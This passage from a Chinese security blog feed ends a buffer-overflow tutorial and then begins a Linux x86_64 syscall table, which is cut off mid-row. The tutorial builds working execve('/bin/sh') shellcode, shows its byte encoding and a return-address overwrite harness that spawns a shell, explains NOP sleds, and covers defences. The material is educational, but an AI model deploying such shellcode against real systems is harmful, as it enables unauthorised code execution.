class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode_test1.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"jmp mycall\n\t"</span></span><br><span class="line">        <span class="string">"func: pop %rbx\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, 0x8(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"xor %rax, %rax\n\t"</span></span><br><span class="line">        <span class="string">"movb %al, 0x7(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movl %eax, 0x10(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movb $0x3b, %al\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x8(%rsp), %rsi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x10(%rsp), %rdx\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"xor %rdi, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"xor %rax, %rax\n\t"</span></span><br><span class="line">        <span class="string">"movb $60, %al\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"mycall: call func\n\t"</span></span><br><span class="line">        <span class="string">".string \"/bin/sh\""</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对照shellcode_test.c，我们只是改变了一些赋值操作。让我们看一下效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ gcc shellcode_test1.c -o shellcode_test1</span><br><span class="line">$ gdb shellcode_test1</span><br><span class="line">...</span><br><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x00000000000005fa &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x00000000000005fb &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x00000000000005fe &lt;+4&gt;:jmp    0x62c &lt;main+50&gt;</span><br><span class="line">   0x0000000000000600 &lt;+6&gt;:pop    %rbx</span><br><span class="line">   0x0000000000000601 &lt;+7&gt;:mov    %rbx,0x8(%rsp)</span><br><span class="line">   0x0000000000000606 &lt;+12&gt;:xor    %rax,%rax</span><br><span class="line">   0x0000000000000609 &lt;+15&gt;:mov    %al,0x7(%rsp)</span><br><span class="line">   0x000000000000060d &lt;+19&gt;:mov    %eax,0x10(%rsp)</span><br><span class="line">   0x0000000000000611 &lt;+23&gt;:mov    <span class="variable">$0x3b</span>,%al</span><br><span class="line">   0x0000000000000613 &lt;+25&gt;:mov    %rbx,%rdi</span><br><span class="line">   0x0000000000000616 &lt;+28&gt;:lea    0x8(%rsp),%rsi</span><br><span class="line">   0x000000000000061b &lt;+33&gt;:lea    0x10(%rsp),%rdx</span><br><span class="line">   0x0000000000000620 &lt;+38&gt;:syscall </span><br><span class="line">   0x0000000000000622 &lt;+40&gt;:xor    %rdi,%rdi</span><br><span class="line">   0x0000000000000625 &lt;+43&gt;:xor    %rax,%rax</span><br><span class="line">   0x0000000000000628 &lt;+46&gt;:mov    <span class="variable">$0x3c</span>,%al</span><br><span class="line">   0x000000000000062a &lt;+48&gt;:syscall </span><br><span class="line">   0x000000000000062c &lt;+50&gt;:callq  0x600 &lt;main+6&gt;</span><br><span class="line">   0x0000000000000631 &lt;+55&gt;:(bad)  </span><br><span class="line">   0x0000000000000632 &lt;+56&gt;:(bad)  </span><br><span class="line">   0x0000000000000633 &lt;+57&gt;:imul   <span class="variable">$0x90006873</span>,0x2f(%rsi),%ebp</span><br><span class="line">   0x000000000000063a &lt;+64&gt;:pop    %rbp</span><br><span class="line">   0x000000000000063b &lt;+65&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ x /51xb main+4</span><br><span class="line">0x5fe &lt;main+4&gt;:0xeb0x2c0x5b0x480x890x5c0x240x08</span><br><span class="line">0x606 &lt;main+12&gt;:0x480x310xc00x880x440x240x070x89</span><br><span class="line">0x60e &lt;main+20&gt;:0x440x240x100xb00x3b0x480x890xdf</span><br><span class="line">0x616 &lt;main+28&gt;:0x480x8d0x740x240x080x480x8d0x54</span><br><span class="line">0x61e &lt;main+36&gt;:0x240x100x0f0x050x480x310xff0x48</span><br><span class="line">0x626 &lt;main+44&gt;:0x310xc00xb00x3c0x0f0x050xe80xcf</span><br><span class="line">0x62e &lt;main+52&gt;:0xff0xff0xff</span><br></pre></td></tr></table></figure><p>现在，我们的shellcode中已经没有0x00了，并且还变短了呢。</p><p>现在，我们试一试这个shellcode作为字符串能否运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shellcode.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\xeb\x2c\x5b\x48\x89\x5c\x24\x08\x48\x31\xc0\x88\x44\x24\x07\x89\x44\x24"</span></span><br><span class="line">                   <span class="string">"\x10\xb0\x3b\x48\x89\xdf\x48\x8d\x74\x24\x08\x48\x8d\x54\x24\x10\x0f\x05"</span></span><br><span class="line">                   <span class="string">"\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xcf\xff\xff\xff/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>  *ret;</span><br><span class="line">    ret = (<span class="keyword">long</span> *)&amp;ret + <span class="number">2</span>;</span><br><span class="line">    (*ret) = (<span class="keyword">long</span>)shellcode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -z execstack -fno-stack-protector -o shellcode shellcode.c</span><br><span class="line">$ ./shellcode</span><br><span class="line">sh-4.4<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>哈，完全可以运行。</p><h2 id="使用shellcode"><a href="#使用shellcode" class="headerlink" title="使用shellcode"></a>使用shellcode</h2><p>现在，我们已经有了shellcode，我们在前面也提供了一种攻击思路，但是最终的困难却在于我们该如何利用缓冲区溢出来修改返回地址，说实话，到现在为止，博主并没有找到一个优雅的、简单的修改返回地址的方法。在我所看的一些文章中，唯一的方法就是“试”，这当然还需要靠点运气，更何况现在操作系统一般采用栈随机化，并不好“试”。</p><p>一种比较好的方法是在shellcode前面加上许多<code>nop</code>指令，并在后面加上许多要覆盖的返回地址。由于<code>nop</code>代表空指令，且只占一个字节，不管我们的返回地址返回到shellcode前面的任何一个<code>nop</code>，程序都会执行到shellcode所在的地方，而不必非要返回到shellcode的开头处，这会大大增加shellcode被执行的机率。</p><img src="/images/缓冲区溢出5.jpg"><p>但是，这对一些比较小的缓冲区却并不是很适用，因为比较小的缓冲区并不能有太多了<code>nop</code>或者太长的shellcode，否则返回地址直接被shellcode或者甚至被nop给覆盖了，在别处看到的是，解决这类小缓冲区的方法也很简单，我们把返回地址放在前面，<code>nop</code>放在中间，shellcode放在最后面，就像这样：</p><img src="/images/缓冲区溢出6.jpg"><p>这样理论上，<code>nop</code>可以很多，执行shellcode的机会也会大大增加。</p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>现代编译器已经加入了许多防范缓冲区溢出的机制，例如缓冲区溢出检查（还记的我前面卖的关子吗？我们使用了gcc的-fno-stack-protector参数，就是让编译器不要加入这种机制，以免干扰我们的实验。）、禁止栈内执行代码（shellcode.c编译时所用的-z execstack，该参数是允许栈内代码执行）。缓冲区溢出检查是指在栈上的局部变量分配之前，先分配一些空间保存某个数，当在程序返回之前，先检查这个数有没有被改变，若被改变了，则立即触发中断，防止去执行shellcode。另外，现代操作系统也加入了许多措施来阻止缓冲区溢出，比如栈的随机化（这又大大降低了我们“猜”中返回地址的机率）。</p><p>但是，尽管操作系统和编译器都加入了如此多的机制来防范缓冲区溢出，但是，攻击者总还是有种种办法绕过这些机制，所以，要从根本上杜绝缓冲区溢出，还是要从我们写程序入手，在对缓冲区操作前，一定要对其操作的范围进行限制，不要使用那些危险的函数，比如<code>gets</code>、不限制长度的<code>strcpy</code>等等。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>程序依靠栈来执行，并将局部变量分配在栈上，<code>call</code>指令也将返回地址放在栈上，这是可以进行缓冲区溢出的前提。</p><p>缓冲区溢出是通过覆盖返回地址，进而去执行攻击程序（shellcode）来实现的。</p><p>shellcode编写完成后要转换为二进制（16进制）数据，且不得出现0x00，这代表了字符串的结束</p><p>防范缓冲区溢出要使用正确的编译选项，更重要的是正确的编写程序。</p><hr><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在现在的网络攻击中，缓冲区溢出方式的攻击占据了很大一部分，缓冲区溢出是一种非常普遍的漏洞，但同时，它也是非常危险的一种漏洞，轻则导致系统宕机
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
      <category term="信息安全" scheme="https://mingliangliu.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统调用表（x86_64）</title>
    <link href="https://mingliangliu.com/posts/a6c4b05f/"/>
    <id>https://mingliangliu.com/posts/a6c4b05f/</id>
    <published>2019-09-02T14:42:38.000Z</published>
    <updated>2020-02-15T06:45:50.768Z</updated>
    
    <content type="html"><![CDATA[<p>内核版本 Linux 4.7</p><p>Note:64位系统中，不再使用<code>int 0x80</code>来进行系统调用，取而代之的是<code>syscall</code>指令</p><table><thead><tr><th>%rax</th><th>System call</th><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%r10</th><th>%r8</th><th>%r9</th></tr></thead><tbody><tr><td>0</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>2</td><td>sys_open</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>3</td><td>sys_close</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>4</td><td>sys_stat</td><td>const char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td>sys_fstat</td><td>unsigned int fd</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>6</td><td>sys_lstat</td><td>fconst char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>7</td><td>sys_poll</td><td>struct poll_fd *ufds</td><td>unsigned int nfds</td><td>long timeout_msecs</td><td></td><td></td><td></td></tr><tr><td>8</td><td>sys_lseek</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td></td><td></td><td></td></tr><tr><td>9</td><td>sys_mmap</td><td>unsigned long addr</td><td>unsigned long len</td><td>unsigned long prot</td><td>unsigned long flags</td><td>unsigned long fd</td><td>unsigned long off</td></tr><tr><td>10</td><td>sys_mprotect</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td></td><td></td><td></td></tr><tr><td>11</td><td>sys_munmap</td><td>unsigned long addr</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>12</td><td>sys_brk</td><td>unsigned long brk</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>sys_rt_sigaction</td><td>int sig</td><td>const struct sigaction *act</td><td>struct sigaction*oact</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>14</td><td>sys_rt_sigprocmask</td><td>int how</td><td>sigset_t *nset</td><td>sigset_t *oset</td><td>size_tsigsetsize</td><td></td><td></td></tr><tr><td>15</td><td>sys_rt_sigreturn</td><td>unsigned long __unused</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>16</td><td>sys_ioctl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>17</td><td>sys_pread64</td><td>unsigned long fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>18</td><td>sys_pwrite64</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>19</td><td>sys_readv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>20</td><td>sys_writev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>21</td><td>sys_access</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>22</td><td>sys_pipe</td><td>int *filedes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>23</td><td>sys_select</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set*exp</td><td>struct timeval*tvp</td><td></td></tr><tr><td>24</td><td>sys_sched_yield</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>25</td><td>sys_mremap</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned longnew_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td></td></tr><tr><td>26</td><td>sys_msync</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>27</td><td>sys_mincore</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char *vec</td><td></td><td></td><td></td></tr><tr><td>28</td><td>sys_madvise</td><td>unsigned long start</td><td>size_t len_in</td><td>int behavior</td><td></td><td></td><td></td></tr><tr><td>29</td><td>sys_shmget</td><td>key_t key</td><td>size_t size</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>30</td><td>sys_shmat</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>31</td><td>sys_shmctl</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>32</td><td>sys_dup</td><td>unsigned int fildes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>33</td><td>sys_dup2</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td></td><td></td><td></td><td></td></tr><tr><td>34</td><td>sys_pause</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>35</td><td>sys_nanosleep</td><td>struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td><td></td><td></td></tr><tr><td>36</td><td>sys_getitimer</td><td>int which</td><td>struct itimerval *value</td><td></td><td></td><td></td><td></td></tr><tr><td>37</td><td>sys_alarm</td><td>unsigned int seconds</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>38</td><td>sys_setitimer</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval*ovalue</td><td></td><td></td><td></td></tr><tr><td>39</td><td>sys_getpid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>40</td><td>sys_sendfile</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td></td><td></td></tr><tr><td>41</td><td>sys_socket</td><td>int family</td><td>int type</td><td>int protocol</td><td></td><td></td><td></td></tr><tr><td>42</td><td>sys_connect</td><td>int fd</td><td>struct sockaddr *uservaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>43</td><td>sys_accept</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td></td><td></td><td></td></tr><tr><td>44</td><td>sys_sendto</td><td>int fd</td><td>void *buff</td><td>size_t len</td><td>unsigned flags</td><td>structsockaddr *addr</td><td>int addr_len</td></tr><tr><td>45</td><td>sys_recvfrom</td><td>int fd</td><td>void *ubuf</td><td>size_t size</td><td>unsigned flags</td><td>structsockaddr *addr</td><td>int *addr_len</td></tr><tr><td>46</td><td>sys_sendmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned flags</td><td></td><td></td><td></td></tr><tr><td>47</td><td>sys_recvmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>48</td><td>sys_shutdown</td><td>int fd</td><td>int how</td><td></td><td></td><td></td><td></td></tr><tr><td>49</td><td>sys_bind</td><td>int fd</td><td>struct sokaddr *umyaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>50</td><td>sys_listen</td><td>int fd</td><td>int backlog</td><td></td><td></td><td></td><td></td></tr><tr><td>51</td><td>sys_getsockname</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>52</td><td>sys_getpeername</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>53</td><td>sys_socketpair</td><td>int family</td><td>int type</td><td>int protocol</td><td>int *usockvec</td><td></td><td></td></tr><tr><td>54</td><td>sys_setsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td></td></tr><tr><td>55</td><td>sys_getsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td></td></tr><tr><td>56</td><td>sys_clone</td><td>unsigned long clone_flags</td><td>unsigned long newsp</td><td>void*parent_tid</td><td>void *child_tid</td><td></td><td></td></tr><tr><td>57</td><td>sys_fork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58</td><td>sys_vfork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>59</td><td>sys_execve</td><td>const char *filename</td><td>const char *const argv[]</td><td>const char* const envp[]</td><td></td><td></td><td></td></tr><tr><td>60</td><td>sys_exit</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>61</td><td>sys_wait4</td><td>pid_t upid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td></td><td></td></tr><tr><td>62</td><td>sys_kill</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td><td></td></tr><tr><td>63</td><td>sys_uname</td><td>struct old_utsname *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>64</td><td>sys_semget</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td></td><td></td><td></td></tr><tr><td>65</td><td>sys_semop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td></td><td></td><td></td></tr><tr><td>66</td><td>sys_semctl</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>union semun arg</td><td></td><td></td></tr><tr><td>67</td><td>sys_shmdt</td><td>char *shmaddr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>68</td><td>sys_msgget</td><td>key_t key</td><td>int msgflg</td><td></td><td></td><td></td><td></td></tr><tr><td>69</td><td>sys_msgsnd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td></td><td></td></tr><tr><td>70</td><td>sys_msgrcv</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td></td></tr><tr><td>71</td><td>sys_msgctl</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>72</td><td>sys_fcntl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>73</td><td>sys_flock</td><td>unsigned int fd</td><td>unsigned int cmd</td><td></td><td></td><td></td><td></td></tr><tr><td>74</td><td>sys_fsync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>75</td><td>sys_fdatasync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>76</td><td>sys_truncate</td><td>const char *path</td><td>long length</td><td></td><td></td><td></td><td></td></tr><tr><td>77</td><td>sys_ftruncate</td><td>unsigned int fd</td><td>unsigned long length</td><td></td><td></td><td></td><td></td></tr><tr><td>78</td><td>sys_getdents</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>79</td><td>sys_getcwd</td><td>char *buf</td><td>unsigned long size</td><td></td><td></td><td></td><td></td></tr><tr><td>80</td><td>sys_chdir</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>81</td><td>sys_fchdir</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>82</td><td>sys_rename</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>83</td><td>sys_mkdir</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>84</td><td>sys_rmdir</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>85</td><td>sys_creat</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>86</td><td>sys_link</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>87</td><td>sys_unlink</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>88</td><td>sys_symlink</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>89</td><td>sys_readlink</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td><td></td></tr><tr><td>90</td><td>sys_chmod</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>91</td><td>sys_fchmod</td><td>unsigned int fd</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>92</td><td>sys_chown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>93</td><td>sys_fchown</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>94</td><td>sys_lchown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>95</td><td>sys_umask</td><td>int mask</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>96</td><td>sys_gettimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>97</td><td>sys_getrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>98</td><td>sys_getrusage</td><td>int who</td><td>struct rusage *ru</td><td></td><td></td><td></td><td></td></tr><tr><td>99</td><td>sys_sysinfo</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>100</td><td>sys_times</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>101</td><td>sys_ptrace</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td></td><td></td></tr><tr><td>102</td><td>sys_getuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>103</td><td>sys_syslog</td><td>int type</td><td>char *buf</td><td>int len</td><td></td><td></td><td></td></tr><tr><td>104</td><td>sys_getgid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>105</td><td>sys_setuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>106</td><td>sys_setgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>107</td><td>sys_geteuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>108</td><td>sys_getegid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>109</td><td>sys_setpgid</td><td>pid_t pid</td><td>pid_t pgid</td><td></td><td></td><td></td><td></td></tr><tr><td>110</td><td>sys_getppid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>111</td><td>sys_getpgrp</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>112</td><td>sys_setsid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>113</td><td>sys_setreuid</td><td>uid_t ruid</td><td>uid_t euid</td><td></td><td></td><td></td><td></td></tr><tr><td>114</td><td>sys_setregid</td><td>gid_t rgid</td><td>gid_t egid</td><td></td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_getgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>116</td><td>sys_setgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>117</td><td>sys_setresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>118</td><td>sys_getresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>119</td><td>sys_setresgid</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td></td><td></td><td></td></tr><tr><td>120</td><td>sys_getresgid</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td></td><td></td><td></td></tr><tr><td>121</td><td>sys_getpgid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>122</td><td>sys_setfsuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>123</td><td>sys_setfsgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>124</td><td>sys_getsid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>125</td><td>sys_capget</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td></td><td></td><td></td><td></td></tr><tr><td>126</td><td>sys_capset</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td></td><td></td><td></td><td></td></tr><tr><td>127</td><td>sys_rt_sigpending</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>128</td><td>sys_rt_sigtimedwait</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct timespec *uts</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>129</td><td>sys_rt_sigqueueinfo</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td><td></td></tr><tr><td>130</td><td>sys_rt_sigsuspend</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>131</td><td>sys_sigaltstack</td><td>const stack_t *uss</td><td>stack_t *uoss</td><td></td><td></td><td></td><td></td></tr><tr><td>132</td><td>sys_utime</td><td>char *filename</td><td>struct utimbuf *times</td><td></td><td></td><td></td><td></td></tr><tr><td>133</td><td>sys_mknod</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td></td><td></td><td></td></tr><tr><td>134</td><td>sys_uselib</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>135</td><td>sys_personality</td><td>unsigned int personality</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>136</td><td>sys_ustat</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td></td><td></td><td></td><td></td></tr><tr><td>137</td><td>sys_statfs</td><td>const char 